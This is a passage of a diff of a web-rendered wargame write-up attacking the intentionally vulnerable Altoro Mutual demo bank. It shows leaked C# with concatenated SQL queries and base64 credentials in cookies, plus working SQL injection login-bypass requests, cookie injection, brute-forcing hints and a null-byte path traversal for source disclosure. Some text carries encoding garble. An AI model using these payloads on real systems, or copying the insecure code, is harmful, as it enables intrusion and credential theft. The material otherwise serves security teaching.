+          <span class="n">if</span> <span class="p">((</span><span class="n">UserInfo</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">sCookieUser</span> <span class="o">!=</span> <span class="n">Session</span><span class="cp">[</span><span class="s2">"userName"</span><span class="cp">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">()))</span>
+          <span class="err">{</span>
+              <span class="n">UserInfo</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HttpCookie</span><span class="p">(</span><span class="s2">"amUserInfo"</span><span class="p">);</span>
+              <span class="n">UserInfo</span><span class="cp">[</span><span class="s2">"UserName"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Base64Encoder</span><span class="p">(</span><span class="n">uName</span><span class="p">)</span><span class="o">.</span><span class="n">GetEncoded</span><span class="p">();</span>
+              <span class="n">UserInfo</span><span class="cp">[</span><span class="s2">"Password"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Base64Encoder</span><span class="p">(</span><span class="n">pWord</span><span class="p">)</span><span class="o">.</span><span class="n">GetEncoded</span><span class="p">();</span>
+              <span class="n">UserInfo</span><span class="o">.</span><span class="n">Expires</span> <span class="o">=</span> <span class="n">dtNow</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">tsHour</span><span class="p">);</span>
+              <span class="n">Response</span><span class="o">.</span><span class="n">Cookies</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">UserInfo</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="nt">HttpCookie</span> <span class="nt">UserId</span> <span class="o">=</span> <span class="nt">Request</span><span class="nc">.Cookies</span><span class="cp">[</span><span class="s2">"amUserId"</span><span class="cp">]</span><span class="o">;</span>
+          <span class="nt">UserId</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">HttpCookie</span><span class="o">(</span><span class="s2">"amUserId"</span><span class="o">);</span>
+          <span class="nt">UserId</span><span class="nc">.Value</span> <span class="o">=</span> <span class="nt">Session</span><span class="cp">[</span><span class="s2">"userId"</span><span class="cp">]</span><span class="nc">.ToString</span><span class="o">();</span>
+          <span class="nt">Response</span><span class="nc">.Cookies.Add</span><span class="o">(</span><span class="nt">UserId</span><span class="o">);</span>
+          <span class="nt">query1</span> <span class="o">=</span> <span class="s2">"SELECT userid, approved, card_type,interest, limit FROM promo WHERE userid="</span> <span class="o">+</span> <span class="nt">Session</span><span class="cp">[</span><span class="s2">"userId"</span><span class="cp">]</span><span class="o">;</span>
+          <span class="nt">OleDbDataAdapter</span> <span class="nt">myApproval</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">OleDbDataAdapter</span><span class="o">(</span><span class="nt">query1</span><span class="o">,</span> <span class="nt">myConnection</span><span class="o">);</span>
+          <span class="nt">myApproval</span><span class="nc">.Fill</span><span class="o">(</span><span class="nt">ds</span><span class="o">,</span> <span class="s2">"promo"</span><span class="o">);</span>
+          <span class="nt">DataTable</span> <span class="nt">myTable</span> <span class="o">=</span> <span class="nt">ds</span><span class="nc">.Tables</span><span class="cp">[</span><span class="s2">"promo"</span><span class="cp">]</span><span class="o">;</span>
+          <span class="nt">DataRow</span> <span class="nt">curRow</span> <span class="o">=</span> <span class="nt">myTable</span><span class="nc">.Rows</span><span class="cp">[</span><span class="mi">0</span><span class="cp">]</span><span class="o">;</span>
+          <span class="nt">if</span> <span class="o">(</span><span class="nt">System</span><span class="nc">.Convert.ToBoolean</span><span class="o">(</span><span class="nt">curRow</span><span class="cp">[</span><span class="s2">"approved"</span><span class="cp">]</span><span class="o">))</span>
+          <span class="p">{</span>
+            <span class="n">HttpCookie</span> <span class="n">CreditOffer</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Cookies</span><span class="cp">[</span><span class="s2">"amCreditOffer"</span><span class="cp">]</span><span class="p">;</span>
+                <span class="n">CreditOffer</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HttpCookie</span><span class="p">(</span><span class="s2">"amCreditOffer"</span><span class="p">);</span>
+            <span class="n">CreditOffer</span><span class="cp">[</span><span class="s2">"CardType"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">curRow</span><span class="cp">[</span><span class="s2">"card_type"</span><span class="cp">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">();</span>
+            <span class="n">CreditOffer</span><span class="cp">[</span><span class="s2">"Limit"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">curRow</span><span class="cp">[</span><span class="s2">"limit"</span><span class="cp">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">();</span>
+            <span class="n">CreditOffer</span><span class="cp">[</span><span class="s2">"Interest"</span><span class="cp">]</span> <span class="o">=</span> <span class="n">curRow</span><span class="cp">[</span><span class="s2">"interest"</span><span class="cp">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">();</span>
+                <span class="n">Response</span><span class="o">.</span><span class="n">Cookies</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="n">CreditOffer</span><span class="p">);</span>
+          <span class="p">}</span>
+      <span class="err">}</span>
+      <span class="nt">myConnection</span><span class="nc">.Close</span><span class="o">();</span>
+      <span class="nt">return</span> <span class="nt">status</span><span class="o">;</span>
+    <span class="err">}</span>
+      <span class="nt">protected</span> <span class="nt">string</span> <span class="nt">GetUserName</span><span class="o">()</span>
+      <span class="p">{</span>
+          <span class="n">HttpCookie</span> <span class="n">UserInfo</span> <span class="o">=</span> <span class="n">Request</span><span class="o">.</span><span class="n">Cookies</span><span class="cp">[</span><span class="s2">"amUserInfo"</span><span class="cp">]</span><span class="p">;</span>
+          <span class="n">if</span> <span class="p">(</span><span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="cp">[</span><span class="s2">"uid"</span><span class="cp">]</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+          <span class="err">{</span>
+              <span class="n">return</span> <span class="n">Request</span><span class="o">.</span><span class="n">Params</span><span class="cp">[</span><span class="s2">"uid"</span><span class="cp">]</span><span class="o">.</span><span class="n">ToString</span><span class="p">();</span>
+          <span class="p">}</span>
+          <span class="nt">if</span> <span class="o">(</span><span class="nt">UserInfo</span> <span class="o">!=</span> <span class="nt">null</span><span class="o">)</span>
+          <span class="p">{</span>
+              <span class="n">return</span> <span class="n">new</span> <span class="n">Base64Decoder</span><span class="p">(</span><span class="n">UserInfo</span><span class="cp">[</span><span class="s2">"UserName"</span><span class="cp">]</span><span class="p">)</span><span class="o">.</span><span class="n">GetDecoded</span><span class="p">();</span>
+          <span class="p">}</span>
+          <span class="nt">else</span>
+          <span class="p">{</span>
+              <span class="n">return</span> <span class="s2">""</span><span class="p">;</span>
+          <span class="p">}</span>
+      <span class="err">}</span>
+    <span class="nf">#region</span> <span class="nt">Web</span> <span class="nt">Form</span> <span class="nt">Designer</span> <span class="nt">generated</span> <span class="nt">code</span>
+    <span class="nt">override</span> <span class="nt">protected</span> <span class="nt">void</span> <span class="nt">OnInit</span><span class="o">(</span><span class="nt">EventArgs</span> <span class="nt">e</span><span class="o">)</span>
+    <span class="p">{</span>
+      <span class="o">//</span>
+      <span class="o">//</span> <span class="n">CODEGEN</span><span class="o">:</span> <span class="n">This</span> <span class="n">call</span> <span class="n">is</span> <span class="n">required</span> <span class="n">by</span> <span class="n">the</span> <span class="n">ASP</span><span class="o">.</span><span class="n">NET</span> <span class="n">Web</span> <span class="n">Form</span> <span class="n">Designer</span><span class="o">.</span>
+      <span class="o">//</span>
+      <span class="n">InitializeComponent</span><span class="p">();</span>
+      <span class="n">base</span><span class="o">.</span><span class="n">OnInit</span><span class="p">(</span><span class="n">e</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="o">///</span> <span class="o">&lt;</span><span class="nt">summary</span><span class="o">&gt;</span>
+    <span class="o">///</span> <span class="nt">Required</span> <span class="nt">method</span> <span class="nt">for</span> <span class="nt">Designer</span> <span class="nt">support</span> <span class="nt">-</span> <span class="nt">do</span> <span class="nt">not</span> <span class="nt">modify</span>
+    <span class="o">///</span> <span class="nt">the</span> <span class="nt">contents</span> <span class="nt">of</span> <span class="nt">this</span> <span class="nt">method</span> <span class="nt">with</span> <span class="nt">the</span> <span class="nt">code</span> <span class="nt">editor</span><span class="o">.</span>
+    <span class="o">///</span> <span class="o">&lt;/</span><span class="nt">summary</span><span class="o">&gt;</span>
+    <span class="nt">private</span> <span class="nt">void</span> <span class="nt">InitializeComponent</span><span class="o">()</span>
+    <span class="p">{</span>
+    <span class="p">}</span>
+    <span class="nf">#endregion</span>
+  <span class="err">}</span>
+<span class="err">}</span>
+</pre></div>
+<h3 id="c6c7fb86f055418b430d443a7f425228">Brute force vulnerability</h3>
+<p>Before we investigate the code, let's have a look at a much common vulnerability. Go to <a href="http://demo.testfire.net/bank/login.aspx">http://demo.testfire.net/bank/login.aspx</a> and use a random user for the login process. You'll get:</p>
+<div class="highlight"><pre>Login Failed: We're sorry, but this username was not found in our system. Please try again.
+</pre></div>
+<p>You could now easily <strong>bruteforce</strong> common usernames in order to login into the application. The same works with passwords too: <em>admin</em> seems to be a valid username. Try to bruteforce the password and you'll get:</p>
+<div class="highlight"><pre>Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
+</pre></div>
+<p><em>admin:admin</em> is a valid username/password combination.</p>
+<h3 id="1893267eeefa97c21a09c4e6d7d15585">SQL injection using POST parameters</h3>
+<p>Now let's have a closer look at the source code... Let's analyze the <em>!ValidateUser</em>function:</p>
+<div class="highlight"><pre>protected string ValidateUser(String uName, String pWord)
     {
       //Set default status to Success
       string status = "Success";
@@ -411,10 +350,10 @@ namespace Altoro
           query2 = Regex.Replace(query2, "--.*", "");
       }
       ....
-</pre>
-<p>As you can see theÂ <em>uName</em>Â parameter doesn’t get sanitized, so you can easily run someÂ <strong>SQL injection</strong>. Let’s try that out. UsingÂ <a href="http://www.portswigger.net/burp/">Burpsuite</a>Â we’ll tamper data sent to the web server and analyze the responses.</p>
-<p>Here’s the request:</p>
-<pre>POST /bank/login.aspx HTTP/1.1
+</pre></div>
+<p>As you can see the <em>uName</em> parameter doesn't get sanitized, so you can easily run some <strong>SQL injection</strong>. Let's try that out. Using <a href="http://www.portswigger.net/burp/">Burpsuite</a> we'll tamper data sent to the web server and analyze the responses.</p>
+<p>Here's the request:</p>
+<div class="highlight"><pre>POST /bank/login.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -425,18 +364,17 @@ Referer: http://demo.testfire.net/bank/login.aspx
 Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 39
-uid=admin%27&amp;passw;=test&amp;btnSubmit;=Login
-</pre>
-<p>As a response you’ll get:</p>
-<pre>An Error Has Occurred
+uid=admin%27<span class="err">&amp;</span>passw=test<span class="err">&amp;</span>btnSubmit=Login
+</pre></div>
+<p>As a response you'll get:</p>
+<div class="highlight"><pre>An Error Has Occurred
 Summary:
 Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''.
 Error Message:
-System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
-</pre>
-<p><a href="http://dornea.nu/wargames/altoro-mutual?action=AttachFile&amp;do=get&amp;target=login_sql_injection.png" title="attachment:login_sql_injection.png">lkashd oada</a></p>
-<p><em>Single quotes</em>Â are obvisouly not escaped so we could inject some SQL statements. Let’s try some common ones likeÂ <strong>admin’ OR 1=1;–</strong>:Â </p>
-<pre>POST /bank/login.aspx HTTP/1.1
+System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
+</pre></div>
+<p><em>Single quotes</em> are obvisouly not escaped so we could inject some SQL statements. Let's try some common ones likeÂ <strong>admin' OR 1=1;-</strong>:</p>
+<div class="highlight"><pre>POST /bank/login.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -447,11 +385,10 @@ Referer: http://demo.testfire.net/bank/login.aspx
 Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 47
-uid=admin' OR 1=1;--&amp;passw;=test&amp;btnSubmit;=Login
-</pre>
-<p>The result looks very promising! We were able to login without specifying any password. All you need is a valid username. The same vulnerability applies to theÂ <em>password</em>Â field as well. Following request will work too:</p>
-<pre>#!highlight c# 
-POST /bank/login.aspx HTTP/1.1
+uid=admin' OR 1=1;--<span class="err">&amp;</span>passw=test<span class="err">&amp;</span>btnSubmit=Login
+</pre></div>
+<p>The result looks very promising! We were able to login without specifying any password. All you need is a valid username. The same vulnerability applies to theÂ <em>password</em> field as well. Following request will work too:</p>
+<div class="highlight"><pre>POST /bank/login.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -459,25 +396,23 @@ Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip, deflate
 Proxy-Connection: keep-alive
 Referer: http://demo.testfire.net/bank/login.aspx
-Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password;=dGVzdA==
+Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==<span class="err">&amp;</span>Password=dGVzdA==
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 50
-uid=admin&amp;passw;=' OR 1=1;--&amp;btnSubmit;=Login</pre>
-<h3 id="67cf80dbb18aadf77119f4a4f5cb98ab"><span id="Base64-encoded_login_credentials">Base64-encoded login credentials</span></h3>
-<p>After a successful login the server will set a cookieÂ <em>amUserInfo</em>Â which contains login information encoded in base64. This is for sure a vulnerability since an attacker could easily decode the information and get the login credentials.</p>
-<pre>amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password;=dGVzdA==
-</pre>
-<p>decodes to…</p>
-<pre>amUserInfo=Username=admin' OR 1=2;--&amp;Password;=test
-</pre>
-<p> </p>
-<h2 id="3b289266841a38499874d73cf76dea4c"><span id="bankmainaspx">/bank/main.aspxÂ </span></h2>
-<hr/>
-<p>After a successful login you’ll be redirected toÂ <a href="http://demo.testfire.net/bank/main.aspx">http://demo.testfire.net/bank/main.aspx</a>. Let’s have a look at the functionalities within this page.</p>
-<p> </p>
-<h3 id="7dfe4e77b9ff513418fef8297c5f792a"><span id="Source_code_disclosure">Source code disclosure</span></h3>
-<p>Here’s the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt</a>)</p>
-<pre>using System.Collections;
+uid=admin<span class="err">&amp;</span>passw=' OR 1=1;--<span class="err">&amp;</span>btnSubmit=Login
+</pre></div>
+<h3 id="67cf80dbb18aadf77119f4a4f5cb98ab">Base64-encoded login credentials</h3>
+<p>After a successful login the server will set a cookie <em>amUserInfo</em> which contains login information encoded in base64. This is for sure a vulnerability since an attacker could easily decode the information and get the login credentials.</p>
+<div class="highlight"><pre>amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password=dGVzdA==
+</pre></div>
+<p>decodes to...</p>
+<div class="highlight"><pre>amUserInfo=Username=admin' OR 1=2;--&amp;Password=test
+</pre></div>
+<h2 id="b972e994dc14d79d46fa4e6b52f434a8">/bank/main.aspx</h2>
+<p>After a successful login you'll be redirected to <a href="http://demo.testfire.net/bank/main.aspx">http://demo.testfire.net/bank/main.aspx</a>. Let's have a look at the functionalities within this page.</p>
+<h3 id="a2d31302f3ea6529e388f323038bd524">Source code disclosure&lt;</h3>
+<p>Here's the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt</a>)</p>
+<div class="highlight"><pre>using System.Collections;
 using System.ComponentModel;
 using System.Data;
 using System.Data.OleDb;
@@ -489,9 +424,9 @@ using System.Web.UI.HtmlControls;
 using System.Configuration;
 namespace Altoro
 {
-    /// &lt;summary&gt;
+    /// <span class="nt">&lt;summary&gt;</span>
     /// Summary description for welcome.
-    /// &lt;/summary&gt;
+    /// <span class="nt">&lt;/summary&gt;</span>
     public partial class Default : Page
     {
         protected void Page_Load(object sender, System.EventArgs e)
@@ -505,39 +440,39 @@ namespace Altoro
             DataRow myRow;
             DataTable acctTable = GetAccounts(thisUser);
             CheckPromo(thisUser);
-            for (int i = 0; i &lt; acctTable.Rows.Count; i++)
-            {
-                myRow = acctTable.Rows[i];
-                ArrayList myList = new ArrayList();
-                myList.Add(myRow["accountid"].ToString());
-                myList.Add(myRow["accountid"].ToString() + " " + myRow["acct_type"].ToString());
-                listAccounts.myItems.Add(myList);
-            }
-        }
-        private DataTable GetAccounts(string userId)
-        {
-            OleDbConnection myConnection = new OleDbConnection();
-            myConnection.ConnectionString = ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;
-            myConnection.Open();
-            string query = "SELECT accountid, acct_type From accounts WHERE userid = " + userId;
-            OleDbDataAdapter myAccounts = new OleDbDataAdapter(query, myConnection);
-            DataSet ds = new DataSet();
-            myAccounts.Fill(ds, "accounts");
-            DataTable myTable = ds.Tables["accounts"];
-            myConnection.Close();
-            return myTable;
-        }
-        private void WritePromo(string cType, string cLimit, string cInterest)
-        {
-            string promoText = "&lt;table width=590 border=0&gt;";
-            promoText += "&lt;tr&gt;&lt;td&gt;&lt;h2&gt;Congratulations! &lt;/h2&gt;&lt;/td&gt;&lt;/tr&gt;";
-            promoText += "&lt;tr&gt;&lt;td&gt;You have been pre-approved for an Altoro ";
+            for (int i = 0; i <span class="nt">&lt; acctTable.Rows.Count</span><span class="err">;</span> <span class="err">i++)</span>
+            <span class="err">{</span>
+                <span class="na">myRow =</span> <span class="s">acctTable.Rows[i];</span>
+                <span class="err">ArrayList</span> <span class="na">myList =</span> <span class="s">new</span> <span class="err">ArrayList();</span>
+                <span class="err">myList.Add(myRow["accountid"].ToString());</span>
+                <span class="err">myList.Add(myRow["accountid"].ToString()</span> <span class="err">+</span> <span class="err">"</span> <span class="err">"</span> <span class="err">+</span> <span class="err">myRow["acct_type"].ToString());</span>
+                <span class="err">listAccounts.myItems.Add(myList);</span>
+            <span class="err">}</span>
+        <span class="err">}</span>
+        <span class="err">private</span> <span class="err">DataTable</span> <span class="err">GetAccounts(string</span> <span class="err">userId)</span>
+        <span class="err">{</span>
+            <span class="err">OleDbConnection</span> <span class="na">myConnection =</span> <span class="s">new</span> <span class="err">OleDbConnection();</span>
+            <span class="na">myConnection.ConnectionString =</span> <span class="s">ConfigurationManager.ConnectionStrings["DBConnStr"].ConnectionString;</span>
+            <span class="err">myConnection.Open();</span>
+            <span class="err">string</span> <span class="na">query =</span> <span class="s">"SELECT accountid, acct_type From accounts WHERE userid = "</span> <span class="err">+</span> <span class="err">userId;</span>
+            <span class="err">OleDbDataAdapter</span> <span class="na">myAccounts =</span> <span class="s">new</span> <span class="err">OleDbDataAdapter(query,</span> <span class="err">myConnection);</span>
+            <span class="err">DataSet</span> <span class="na">ds =</span> <span class="s">new</span> <span class="err">DataSet();</span>
+            <span class="err">myAccounts.Fill(ds,</span> <span class="err">"accounts");</span>
+            <span class="err">DataTable</span> <span class="na">myTable =</span> <span class="s">ds.Tables["accounts"];</span>
+            <span class="err">myConnection.Close();</span>
+            <span class="err">return</span> <span class="err">myTable;</span>
+        <span class="err">}</span>
+        <span class="err">private</span> <span class="err">void</span> <span class="err">WritePromo(string</span> <span class="err">cType,</span> <span class="err">string</span> <span class="err">cLimit,</span> <span class="err">string</span> <span class="err">cInterest)</span>
+        <span class="err">{</span>
+            <span class="err">string</span> <span class="na">promoText =</span> <span class="s">"&lt;table width=590 border=0&gt;"</span><span class="err">;</span>
+            <span class="err">promoText</span> <span class="err">+=</span> <span class="err">"&lt;tr</span><span class="nt">&gt;&lt;td&gt;&lt;h2&gt;</span>Congratulations! <span class="nt">&lt;/h2&gt;&lt;/td&gt;&lt;/tr&gt;</span>";
+            promoText += "<span class="nt">&lt;tr&gt;&lt;td&gt;</span>You have been pre-approved for an Altoro ";
             promoText += cType;
             promoText += " Visa with a credit limit of $";
             promoText += cLimit;
-            promoText += "!&lt;/td&gt;&lt;/tr&gt;";
-            promoText += "&lt;tr&gt;&lt;td&gt;Click &lt;a href='apply.aspx";
-            promoText += "'&gt;Here&lt;/a&gt; to apply.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+            promoText += "!<span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>";
+            promoText += "<span class="nt">&lt;tr&gt;&lt;td&gt;</span>Click <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'apply.aspx";</span>
+<span class="s">            promoText += "'</span><span class="nt">&gt;</span>Here<span class="nt">&lt;/a&gt;</span> to apply.<span class="nt">&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span>";
             promo.Visible = true;
             promo.Text = promoText;
         }
@@ -569,21 +504,20 @@ namespace Altoro
             InitializeComponent();
             base.OnInit(e);
         }
-        /// &lt;summary&gt;
+        /// <span class="nt">&lt;summary&gt;</span>
         /// Required method for Designer support - do not modify
         /// the contents of this method with the code editor.
-        /// &lt;/summary&gt;
+        /// <span class="nt">&lt;/summary&gt;</span>
         private void InitializeComponent()
         {
         }
         #endregion
     }
 }
-</pre>
-<p> </p>
-<h3 id="7b966d041c9c404fa4d83013a8280060"><span id="SQL_injection_using_Cookie_data">SQL injection using Cookie data</span></h3>
+</pre></div>
+<h3 id="7b966d041c9c404fa4d83013a8280060">SQL injection using Cookie data</h3>
 <p>After login following request will be sent to the server:</p>
-<pre>GET /bank/main.aspx HTTP/1.1
+<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -591,67 +525,58 @@ Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip, deflate
 Proxy-Connection: keep-alive
 Referer: http://demo.testfire.net/bank/login.aspx
-Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=1
-</pre>
-<p>A look at theÂ <em>GetAccounts</em>Â in the source code reveals thatÂ <em>userId</em>Â is actually some data from the cookieÂ <em>amUserId</em>Â and never gets sanitized. Let’s have some fun:</p>
-<pre>#!highlight html 
-GET /bank/main.aspx HTTP/1.1
+Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=1
+</pre></div>
+<p>A look at the <em>GetAccounts</em> in the source code reveals that <em>userId</em> is actually some data from the cookie <em>amUserId</em> and never gets sanitized. Let's have some fun:</p>
+<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
 ...
-amUserInfo=UserName=YWRtaW4=&amp;Password;=YWRtaW4=; amUserId=1'
-</pre>
-<p><em>amUserId</em>Â was changed and the whole GET request was sent again to the server. The response was quite informative:Â </p>
-<pre>#!highlight asp-cx 
-An Error Has Occurred
+<span class="nv">amUserInfo</span><span class="o">=</span><span class="nv">UserName</span><span class="o">=</span><span class="nv">YWRtaW4</span><span class="o">=</span><span class="p">&amp;</span><span class="nv">Password</span><span class="o">=</span><span class="nv">YWRtaW4</span><span class="o">=</span><span class="p">;</span> <span class="nv">amUserId</span><span class="o">=</span>1<span class="err">'</span>
+</pre></div>
+<p><em>amUserId</em> was changed and the whole GET request was sent again to the server. The response was quite informative:</p>
+<div class="highlight"><pre>An Error Has Occurred
 Summary:
 Syntax error in string in query expression 'userid = 1''.
 Error Message:
-System.Data.OleDb.OleDbException: Syntax error in string in query expression 'userid = 1''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websiteankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
-</pre>
